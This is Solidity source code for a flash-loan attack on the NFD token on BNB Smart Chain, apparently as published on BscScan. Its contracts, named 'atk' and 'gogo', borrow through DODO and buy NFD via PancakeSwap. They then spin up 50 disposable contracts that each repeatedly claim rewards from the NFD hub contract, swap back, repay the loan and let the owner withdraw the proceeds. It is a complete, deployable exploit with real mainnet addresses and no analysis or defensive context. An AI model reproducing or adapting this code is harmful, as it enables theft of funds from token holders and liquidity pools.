/**
 *Submitted for verification at BscScan.com on 2022-09-28
*/

// SPDX-License-Identifier: None


// NFD 闪电贷
// 存档节点区块高度：21139049
// 网络：BSC

pragma solidity 0.8.15;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function withdraw(uint wad) external;

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function _BASE_TOKEN_() external view returns (address); // 池子代币amount
}

interface IGet {
    function getToken() external;
}

contract Ownable {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "1");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
}


contract ls {
    address hub = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;
    address nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
    address owner;
    constructor(address _mainCa) {
        owner = _mainCa;
    }
    function getToken() external {
        require(msg.sender == owner);
        hub.call(abi.encodeWithSelector(0x6811e3b9));
        uint256 getTokenBalance = IERC20(nfd).balanceOf(address(this));
        IERC20(nfd).transfer(owner, getTokenBalance);
    }
}



contract atk is Ownable{
    address usdt = 0x55d398326f99059fF775485246999027B3197955;
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address cakeRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
   


    function exp() internal {
        IERC20(wbnb).approve(cakeRouterV2, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        IERC20(usdt).approve(cakeRouterV2, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        IERC20(nfd).approve(cakeRouterV2, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

        address[] memory BUY_PATH = new address[](3);
        BUY_PATH[0] = wbnb;
        BUY_PATH[1] = usdt;
        BUY_PATH[2] = nfd;


        address[] memory SELL_PATH = new address[](3);
        SELL_PATH[0] = nfd;
        SELL_PATH[1] = usdt;
        SELL_PATH[2] = wbnb;

        uint256 wbnbBalance = IERC20(wbnb).balanceOf(address(this));

        IUniswapV2Router(cakeRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbBalance,
            0,
            BUY_PATH,
            address(this),
            block.timestamp
        );

        news();

        uint256 tokenbalance = IERC20(nfd).balanceOf(address(this));
        

        IUniswapV2Router(cakeRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenbalance,
            0,
            SELL_PATH,
            address(this),
            block.timestamp
        );
        
    }

    function news() internal {
        for (uint256 i=0; i<50; ++i){
            ls lsAddr = new ls(address(this));
            address newAddr = address(lsAddr);
            uint256 tokenBalance = IERC20(nfd).balanceOf(address(this));
            IERC20(nfd).transfer(newAddr, tokenBalance);
            IGet(newAddr).getToken();
        }
    }
}

contract gogo is Ownable, atk {

    receive() external payable {}

    function dodoFlashLoan(
        address flashLoanPool,
        uint256 loanAmount, 
        address loanToken
    ) external onlyOwner {
        bytes memory data = abi.encode(flashLoanPool, loanToken, loanAmount);
        address flashLoanBase = IDODO(flashLoanPool)._BASE_TOKEN_();
        if(flashLoanBase == loanToken) {
            IDODO(flashLoanPool).flashLoan(loanAmount, 0, address(this), data);
        } else {
            IDODO(flashLoanPool).flashLoan(0, loanAmount, address(this), data);
        }
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }


    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.decode(data, (address, address, uint256));
        require(sender == address(this) && msg.sender == flashLoanPool, "HANDLE_FLASH_NENIED");
        exp();
        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
    }


    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "ERROR: w1");
        payable(msg.sender).transfer(balance);
    }

    function safeWithdrawERC20(address _ERC20_Token, uint256 _amount) external onlyOwner {
        require(_amount > 0, "ERROR: w2");
        IERC20(_ERC20_Token).transfer(msg.sender, _amount);
    }

    function withdrawERC20(address _ERC20_Token) external onlyOwner {
        uint256 amount = IERC20(_ERC20_Token).balanceOf(address(this));
        IERC20(_ERC20_Token).transfer(msg.sender, amount);
    }
}